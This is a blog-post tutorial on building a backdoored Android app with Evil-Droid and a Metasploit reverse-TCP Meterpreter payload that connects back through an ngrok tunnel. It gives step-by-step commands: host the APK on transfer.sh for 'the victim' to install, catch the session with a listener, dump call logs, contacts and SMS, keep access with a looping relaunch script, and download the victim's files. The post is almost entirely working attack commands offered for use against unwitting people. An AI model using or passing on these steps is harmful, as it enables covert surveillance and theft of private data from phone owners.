---
layout: post-detail
title: Create a backdoored app with evil droid and metasploit.
date: 2018-06-29
categories: android metasploit
description: Create a backdoored app for android with evil-droid and metasploit.
img-url: ''
comments: true
---

Hi, all test has done on Kali linux.

# Ngrok

Create an account to use tcp connection: https://ngrok.com.
Address email like http://www.yopmail.com/en/ work.
After create your account, just follow instruction to download, unzip, and create an token.

    # 7z x ngrok
    # ./ngrok --authtoken xxx

Create a tcp tunnel on port 1234:

    # ./ngrok tcp 1234
    
You will receive something like this:

```
tcp.ngrok.io:15322 -> localhost:1234
```
    
# Evil-Droid

Download evil-droid: 

    # git clone https://github.com/M4sc3r4n0/Evil-Droid
    # cd Evil-Droid
    # chmod +x evil-droid
    # ./evil-droid

```
[4] BYPASS AV APK (ICON CHANGE)
SET LHOST: tcp.ngrok.io
SET LPORT: 15322
PAYLOAD NAME: nice-app
payload option: android/meterpreter/reverse_tcp
choose payload apk: APK-MSF
```

Choose an image for your backdoored app.  
After, evil-droid will create self-signed certificate to sign your android app, once you have your app, `EXIT`.

# Copy file to transfer.sh

    cd Evil-Droid/evilapk
    # curl --upload-file nice-app.apk https://transfer.sh/nice-app.apk

And give the link to the victim, she|he must install the app to their phone.

# Metasploit

Open a new terminal, we use metasploit to listen on port 1234.

    # msfconsole
      use multi/handler
      set payload android/meterpreter/reverse_tcp
      set lhost 127.0.0.1
      set lport 1234
      exploit

To get call log, contact and sms.

    dump_calllog
    dump_contacts
    dump_sms

type `help` for other commands.

# Maintain the access more time

Now than you have access to the phone, we will upload our script to maintain the access until the phone shutdown.

Open an other terminal to create a little script:

    # vim backdoor.sh

```
#!/bin/bash
while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done
```

And back to metasploit, we are again on the phone:

    cd /sdcards/download
    upload backdoor.sh
    shell
    sh backdoor.sh

Ctrl+C to quit, and all the 20sec, the app is maintain will back.

If the phone of the victim shutdown or restart, you lost the access like the `backdoor.sh` do not start at boot :-(, and we don't have the root privilege to do this.

# Download files

To download files from the phone:
    
    cd /sdcard
    ls 
    cd download
    download <filename>
